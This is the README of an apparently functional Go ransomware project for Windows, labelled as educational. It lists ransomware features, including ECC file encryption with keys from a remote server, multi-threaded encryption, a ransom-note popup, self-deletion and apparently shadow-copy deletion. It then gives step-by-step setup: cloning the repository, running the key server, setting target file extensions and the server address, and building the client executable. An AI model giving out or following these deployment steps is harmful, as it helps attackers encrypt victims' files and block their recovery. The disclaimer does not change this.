# Ransomware-For-Study

[简体中文](./README-zh-cn.md)

Project Description:

This is a basic ransomware project framework for educational purposes, designed to:
- Provide insights for cybersecurity professionals combating malware
- Offer beginners in malware analysis a basic ransomware attack workflow

**WARNING:**
> 
    - This project is FOR EDUCATIONAL PURPOSES ONLY
    - STRICTLY PROHIBITED for any illegal use
    - The author bears no responsibility for misuse


---

## Key Features

1. Mutex creation to prevent multiple instances
2. ECC encryption with separate public/private key storage (only public key exposed during encryption)
3. Multi-threaded file encryption
4. Post-encryption notepad popup functionality
5. Self-deletion after encryption

---

**TODO (Pending Features):**

~~1. Volume shadow copy deletion~~

2. Desktop wallpaper replacement (resource section attempted but failed)
3. Multiple encryption method implementations
4. Multi-folder polling

~~5. HTTPS for public key transmission~~

## Installation

**Important:**
This project only works on Windows OS!

### 1. Download Project
```bash
git clone https://github.com/CuteCuteYu/RansomwareFS
```

### 2. Initialize Project
```bash
cd RansomwareFS
go mod tidy
```

### 3. Start Public Key Server

**Recommendation:** Replace the SSL certificates with ones from other sources before starting

Certificate location:
`ssl-cert` folder

```bash
go run ./server.go ./handler.go
```

### 4. Configuration

#### 4.1 File Extensions and Encryption Threads
`./client/enc_file/enc_file.go`
```go
const (
	FileExtension = ".exe"
	ThreadNumber  = 10 // Number of threads to use for encryption
)
```

#### 4.2 Server Address for Public Key Retrieval
`./client/get_pub_key/get_pub_key.go`
```go
const (
	ServerAddr = "localhost"
	ServerPort = "8080"
)
```

#### 4.3 Mutex Name Configuration
`./client/mutex/mutex.go`
```go
mutexName := "Global\\mypkg_mutex"
```

### 5. Run or Build Client

#### 5.1 Direct Run
```bash
go run ./cmd/client/main.go
```

#### 5.2 Build Executable

(run as Administrator can use delete_shadow!)

```bash
go build ./cmd/client/main.go
